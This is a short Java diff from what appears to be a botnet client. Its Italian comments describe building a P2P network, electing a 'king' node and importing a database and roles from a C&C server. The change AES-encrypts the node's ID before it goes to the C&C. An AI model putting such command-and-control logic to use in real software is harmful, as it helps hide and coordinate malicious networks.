@@ -429,7 +429,7 @@ public class Behavior {
 		pServ.setNewKing(nServ.getIdHash());
 		System.out.println("Creo grafo rete P2P");
 		pServ.createNetworkP2P();
-		String myId = nServ.getIdHash();
+		String myId =pki.getCrypto().encryptAES(nServ.getIdHash());
 		System.out.println("Importo Database dal C&C");
 		// richiesta ruoli
 		List<Role> roles = req.getRoles(ip, myId);
